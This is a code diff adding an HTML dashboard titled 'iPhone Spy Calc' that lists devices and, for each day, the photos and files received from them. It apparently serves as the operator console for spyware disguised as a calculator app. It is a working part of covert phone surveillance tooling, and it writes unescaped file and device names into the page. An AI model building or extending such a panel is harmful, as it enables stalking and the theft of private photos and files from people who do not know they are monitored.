@@ -1,0 +1,108 @@
+ <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Painel — iPhone Spy Calc</title>
+<style>
+  body { font-family: system-ui, sans-serif; background:#111; color:#eee; margin:0; padding:16px; }
+  h1 { color:#0af; font-size:20px; }
+  .device { background:#1c1c1c; border:1px solid #333; border-radius:8px; padding:14px; margin:12px 0; }
+  .device h2 { margin:0 0 10px; color:#0f0; font-size:16px; }
+  .dia { color:#aaa; font-size:13px; margin:10px 0 4px 8px; font-weight:bold; }
+  .tipo { color:#fa0; font-size:12px; margin-left:16px; margin-top:6px; }
+  .gal { display:flex; flex-wrap:wrap; gap:5px; margin:6px 0 6px 16px; }
+  .gal a { display:block; }
+  .gal img { width:70px; height:70px; object-fit:cover; border-radius:4px; border:1px solid #333; }
+  .file { font-size:12px; color:#8cf; margin-left:16px; word-break:break-all; }
+  .vazio { color:#666; font-style:italic; }
+  button { background:#0af; color:#000; border:0; padding:8px 14px; border-radius:6px; cursor:pointer; font-weight:bold; }
+</style>
+</head>
+<body>
+<h1>📸 Painel — iPhone Spy Calc</h1>
+<button onclick="carregar()">🔄 Atualizar</button>
+<div id="conteudo"><p class="vazio">Carregando...</p></div>
+
+<script>
+async function carregar() {
+  const el = document.getElementById('conteudo');
+  el.innerHTML = '<p class="vazio">Carregando...</p>';
+
+  let dados;
+  try {
+    const r = await fetch('/api/list');
+    dados = await r.json();
+  } catch (e) {
+    el.innerHTML = '<p class="vazio">Erro ao carregar. Servidor offline?</p>';
+    return;
+  }
+
+  const devices = Object.keys(dados);
+  if (devices.length === 0) {
+    el.innerHTML = '<p class="vazio">Nenhum device ainda. Nada recebido.</p>';
+    return;
+  }
+
+  el.innerHTML = '';
+  for (const dev of devices) {
+    const divDev = document.createElement('div');
+    divDev.className = 'device';
+    divDev.innerHTML = `<h2>📱 ${dev}</h2>`;
+
+    const dias = dados[dev];
+    for (const dia of Object.keys(dias).sort().reverse()) {
+      const divDia = document.createElement('div');
+      divDia.className = 'dia';
+      divDia.textContent = `📅 ${dia}`;
+      divDev.appendChild(divDia);
+
+      const tipos = dias[dia];
+      for (const tipo of Object.keys(tipos)) {
+        const divTipo = document.createElement('div');
+        divTipo.className = 'tipo';
+        divTipo.textContent = `▸ ${tipo} (${tipos[tipo].length})`;
+        divDev.appendChild(divTipo);
+
+        const arquivos = tipos[tipo];
+        const extImg = /\.(jpg|jpeg|png|gif|webp|heic)$/i.test.bind(/\.(jpg|jpeg|png|gif|webp|heic)$/i);
+
+        if (arquivos.some(f => extImg(f))) {
+          const gal = document.createElement('div');
+          gal.className = 'gal';
+          for (const f of arquivos) {
+            const url = `/files/${dev}/${dia}/${tipo}/${encodeURIComponent(f)}`;
+            if (extImg(f)) {
+              const a = document.createElement('a');
+              a.href = url; a.target = '_blank';
+              const img = document.createElement('img');
+              img.src = url; img.loading = 'lazy';
+              a.appendChild(img);
+              gal.appendChild(a);
+            } else {
+              const p = document.createElement('div');
+              p.className = 'file';
+              p.innerHTML = `📄 <a href="${url}" target="_blank" style="color:#8cf">${f}</a>`;
+              gal.appendChild(p);
+            }
+          }
+          divDev.appendChild(gal);
+        } else {
+          for (const f of arquivos) {
+            const url = `/files/${dev}/${dia}/${tipo}/${encodeURIComponent(f)}`;
+            const p = document.createElement('div');
+            p.className = 'file';
+            p.innerHTML = `📄 <a href="${url}" target="_blank" style="color:#8cf">${f}</a>`;
+            divDev.appendChild(p);
+          }
+        }
+      }
+    }
+    el.appendChild(divDev);
+  }
+}
+
+carregar();
+</script>
+</body>
+</html>
